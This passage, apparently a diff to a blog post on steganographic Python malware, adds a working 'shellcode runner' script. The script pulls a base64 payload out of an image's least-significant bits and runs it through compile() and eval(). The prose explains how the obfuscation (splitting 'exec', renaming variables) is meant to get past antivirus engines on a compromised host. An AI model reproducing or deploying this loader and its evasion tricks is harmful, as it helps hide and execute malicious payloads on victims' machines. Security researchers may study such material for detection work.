@@ -194,4 +194,38 @@ Comparing this new code to the old version, we can see we've created the string 
 ## runner.py
 
 ```python
+from PIL import Image
+import base64
+import types
+
+def b2t(bd):
+    return ''.join(chr(int(bd[i:i+8], 2)) for i in range(0, len(bd), 8))
+
+def decodeFunction(eip):
+    ei = Image.open(eip)
+    ei = ei.convert("RGB")
+    width, height = ei.size
+    bd = ""
+    for y in range(height):
+        for x in range(width):
+            pixel = ei.getpixel((x, y))
+            for channel in range(3):
+                bd += format(pixel[channel] & 1, '01')
+    end_index = bd.find("00000000")
+    bd = bd[:end_index]
+    ptd = b2t(bd)
+    return ptd
+
+if __name__ == "__main__":
+    encoded_image_path = "poc_example.png"
+    string2ex = base64.b64decode(decodeFunction(encoded_image_path) + "===")
+    obfs1 = "ex" 
+    obfs2 = "ec"
+    compiled_code = compile(string2ex, '<string>', obfs1 + obfs2)
+    eval(compiled_code)
 ```
+
+The above file, `runner.py`, is the script that would be stored on disk, alongside the malicious image, on the compromised host. Looking at the above code, and comparing it the prior version, we can observe there is no longer any natively "malicious" functions in plaintext for the AV engine to easily detect. I've renamed some variables, to make analysis harder, and performed some minor obfuscation operations at the end of the script. In order to execute this 2nd stage payload, encoded within the image, we could've just used `exec(string2ex)`. The issue with this `exec()` function, in the context of the script, is that it is commonly abused in malware execution chains. I'm still calling `exec()`, but proxying the function through the `compile()` & `eval()` functions instead, both of which are less likely to flag up than `exec()`. We can run this new update shellcode runner and see the number of detections:
+
+
+[![2](/assets/images/PyStegMalz2/2.PNG)](/assets/images/PyStegMalz2/2.PNG){: .align-center}
